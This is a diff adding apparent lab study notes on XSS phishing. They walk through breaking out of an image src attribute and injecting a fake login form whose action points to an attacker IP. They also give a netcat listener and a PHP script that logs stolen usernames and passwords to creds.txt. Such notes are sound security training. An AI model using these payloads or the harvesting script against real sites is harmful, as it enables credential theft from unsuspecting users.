@@ -324,3 +324,125 @@ we can see our payloads at the end of the page's source code:
 
 in this example the elements we are targeting are at the end of the source code but if we wanted to inject on an element in the middle of the source then other scripts/elements might require modifications to our payload
 
+## Phishing
+
+common form of XSS phishing is injecting fake login forms that send the login details to the attacker's server 
+
+### XSS Discovery 
+
+our target is an image URL form that displays our URL via a URL parameter: 
+
+![](Images/Pasted%20image%2020240124181541.png)
+
+when we try some of our basic payloads we don't get any results but we can understand from the source code how our input is being used: 
+
+![](Images/Pasted%20image%2020240124181848.png)
+
+in this we can see that our input is being placed directly into the `src` attribute without any sanitation 
+
+now we can try a payload like: 
+
+`'> <script>alert(window.origin)</script>`
+
+this exploits the direct input by closing the `img` tag in the source code to then execute the input script
+
+![](Images/Pasted%20image%2020240124182309.png)
+
+### Login form injection 
+
+to perform an XSS phishing attack we need to inject HTML that displays a login form on the targeted page
+
+first we create an HTML form that is seemingly legit: 
+
+```html
+<h3>Please login to continue</h3>
+<form action=http://OUR_IP>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+```
+
+with this form we specify the form action to be our own server's IP so that we can listen for any given credentials
+
+using `document.write()` we can write our minified HTML to the page using the XSS vulnerability we found
+
+````javascript
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+````
+
+our payload becomes: 
+
+```HTML 
+'> <script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+
+![](Images/Pasted%20image%2020240124192630.png)
+### Cleaning up 
+
+we were successful in inserting our form but now we should modify the script to remove the image field to make it more believable 
+
+we can add `document.getElementById('urlform').remove()` to our payload:
+
+![](Images/Pasted%20image%2020240124192821.png)
+
+then we can also comment out the trailing text at the end of our form with `<!--`
+
+![](Images/Pasted%20image%2020240124192917.png)
+
+now our final payload looks like: 
+
+```
+'> <script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.210:81><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script> <!--
+```
+
+### Credential stealing
+
+now that our payload is ready we need to setup our server to steal the credentials that might be passed by the user 
+
+lets start a netcat server: 
+
+`sudo nc -lvnp 81`
+
+then when we login with our payload url we can see the HTTP request come through on our server: 
+
+![](Images/Pasted%20image%2020240124195526.png)
+
+however, we are currently only listening, so the user will get an error because we aren't responding  
+we can use a basic PHP script that logs credentials from the HTTP requests and then returns the victim to the original page 
+
+here is an example script: 
+
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+
+we can save this as `index.php` and put it in `/tmp/tmpserver/`
+
+then we can instead start a PHP server instead of netcat: 
+
+```shell
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+vi index.php #at this step we wrote our index.php file
+sudo php -S 0.0.0.0:80
+```
+
+![](Images/Pasted%20image%2020240124200231.png)
+
+then with our script it will redirect users after stealing the credentials, then if we check the creds.txt file we can see all of the collected credentials
+
+
+
+
+
+
+
